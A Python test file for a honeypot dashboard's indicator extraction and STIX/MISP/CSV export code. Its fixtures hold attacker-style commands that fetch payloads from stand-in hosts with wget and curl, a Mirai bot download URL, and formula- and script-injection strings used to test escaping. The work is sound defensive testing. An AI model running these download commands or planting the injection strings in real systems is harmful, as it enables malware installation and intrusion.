"""dashboard/ioc.py: which indicators are collected, and that every format stays well-formed."""
import csv
import io
import json
import os
import sys
import unittest

ROOT = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, os.path.join(ROOT, "dashboard"))
import ioc  # noqa: E402

T = 1_700_000_000_000
SHA = "a" * 64


def sessions():
    return [
        {"id": "s1", "kind": "ssh", "ip": "45.155.205.10", "cls": "human", "stage": 3, "start": T, "end": T + 9,
         "tech": ["T1105"], "campaign": "c-1", "_events": [
             {"eventid": "cowrie.command.input", "t": T, "input": "cd /tmp; wget http://evil.example.com/x.sh; "
                                                                  "curl http://10.0.0.15/a; curl http://fileserver01/b; "
                                                                  "curl 'http://bad.example.org/q?a=1'\\''x'"},
             {"eventid": "cowrie.session.file_download", "t": T, "url": "http://179.43.140.3:8080/bot.arm7",
              "shasum": SHA}]},
        {"id": "s2", "kind": "web", "ip": "185.220.101.4", "cls": "script", "stage": 0, "start": T, "end": T},
        {"id": "s3", "kind": "ssh", "ip": "8.8.4.4", "cls": "script", "stage": 1, "start": T, "end": T},  # own IP
        {"id": "s4", "kind": "ssh", "ip": "10.1.2.3", "cls": "script", "stage": 3, "start": T, "end": T},     # private
        {"id": "s5", "kind": "ssh", "ip": "91.92.240.17", "cls": "agent_confirmed", "stage": 1, "start": T, "end": T,
         "trips": [{"kind": "token"}], "_backend": [
             {"type": "fetch", "t": T, "url": "https://=cmd|' /C calc'!A0.example.net/p"},
             {"type": "exec", "t": T, "argv": "wget -q https://payload.example.net/m -O-"}]},
    ]


SAMPLES = [{"sha": SHA, "first": T, "last": T, "names": ["bot.arm7"], "how": "downloaded in the fake shell",
            "sessions": [{"id": "s1", "ip": "45.155.205.10"}], "yara": [{"rule": "Mirai"}], "size": 1000},
           {"sha": "b" * 64, "first": T, "last": T, "sessions": [{"id": "s3", "ip": "8.8.4.4", "own": True}],
            "own_only": True}]


def collect(**kw):
    return ioc.collect(sessions(), SAMPLES, own={"8.8.4.4"}, local_names=["fileserver01", "northbridge"], **kw)


class CollectTest(unittest.TestCase):
    def test_what_is_collected(self):
        d = collect()
        self.assertEqual(set(d["ip"]), {"45.155.205.10", "185.220.101.4", "91.92.240.17"})
        self.assertEqual(set(d["sha256"]), {SHA})
        self.assertIn("http://evil.example.com/x.sh", d["url"])
        self.assertIn("http://179.43.140.3:8080/bot.arm7", d["url"])
        self.assertIn("https://payload.example.net/m", d["url"])
        self.assertFalse(any("10.0.0.15" in u or "fileserver01" in u for u in d["url"]))
        self.assertIn("evil.example.com", d["domain"])
        self.assertEqual(d["ip"]["45.155.205.10"]["tech"], {"T1105"})

    def test_engaged_only_drops_scanners(self):
        d = collect(only_engaged=True)
        self.assertEqual(set(d["ip"]), {"45.155.205.10", "91.92.240.17"})   # s5 tripped a lure

    def test_own_addresses_never_leak(self):
        ss = sessions()
        ss[0]["_events"].append({"eventid": "cowrie.command.input", "t": T,
                                 "input": "wget http://8.8.4.4/x; curl http://8.8.4.4:8080/y"})
        samples = [dict(SAMPLES[0], sessions=[{"id": "s1", "ip": "45.155.205.10"},
                                              {"id": "s3", "ip": "8.8.4.4", "own": True}])]
        d = ioc.collect(ss, samples, own={"8.8.4.4"}, local_names=["fileserver01"])
        blob = ioc.to_csv(d) + ioc.to_stix(d, now_ms=T) + ioc.to_misp(d, now_ms=T)
        self.assertNotIn("8.8.4.4", blob)

    def test_since(self):
        self.assertEqual(collect(since_ms=T + 100)["ip"], {})


class FormatTest(unittest.TestCase):
    def setUp(self):
        self.d = collect()

    def test_stix(self):
        b = json.loads(ioc.to_stix(self.d, tlp="green", now_ms=T))
        self.assertEqual(b["type"], "bundle")
        ind = [o for o in b["objects"] if o["type"] == "indicator"]
        self.assertEqual(len(ind), sum(len(v) for v in self.d.values()))
        pats = {o["pattern"] for o in ind}
        self.assertIn("[ipv4-addr:value = '45.155.205.10']", pats)
        self.assertIn(f"[file:hashes.'SHA-256' = '{SHA}']", pats)
        for o in ind:  # quotes and backslashes in attacker URLs are escaped inside the pattern
            inner = o["pattern"].split(" = '", 1)[1][:-2]
            self.assertNotRegex(inner.replace("\\\\", "").replace("\\'", ""), "'")
            self.assertEqual(o["object_marking_refs"], [ioc.TLP_STIX["green"]])
        again = json.loads(ioc.to_stix(self.d, now_ms=T))
        self.assertEqual({o["id"] for o in ind}, {o["id"] for o in again["objects"] if o["type"] == "indicator"})

    def test_misp(self):
        ev = json.loads(ioc.to_misp(self.d, tlp="amber", now_ms=T))["Event"]
        types = {a["type"] for a in ev["Attribute"]}
        self.assertEqual(types, {"ip-src", "sha256", "url", "domain"})
        self.assertIn({"name": "tlp:amber"}, ev["Tag"])
        self.assertEqual(ev["distribution"], "0")

    def test_csv_defuses_formulas(self):
        text = ioc.to_csv(self.d).lstrip("﻿")
        rows = list(csv.reader(io.StringIO(text)))
        self.assertEqual(rows[0][0], "type")
        for r in rows[1:]:
            for c in r:
                self.assertFalse(c[:1] in ("=", "+", "-", "@"), c)

    def test_txt(self):
        lines = ioc.to_txt(self.d, "ip").splitlines()
        self.assertEqual(sorted(lines), ["185.220.101.4", "45.155.205.10", "91.92.240.17"])

    def test_stix_escaping_and_url_checks(self):
        self.assertEqual(ioc.stix_pattern("url", "http://x.example.com/a'b\\c"),
                         "[url:value = 'http://x.example.com/a\\'b\\\\c']")
        self.assertEqual(ioc.clean_url("http://x.example.com/a\x00b"), "")
        self.assertEqual(ioc.clean_url("javascript:alert(1)"), "")
        self.assertEqual(ioc.clean_url("http://192.168.1.1/x"), "")
        self.assertEqual(ioc.clean_url("http://intranet/x"), "")


if __name__ == "__main__":
    unittest.main()
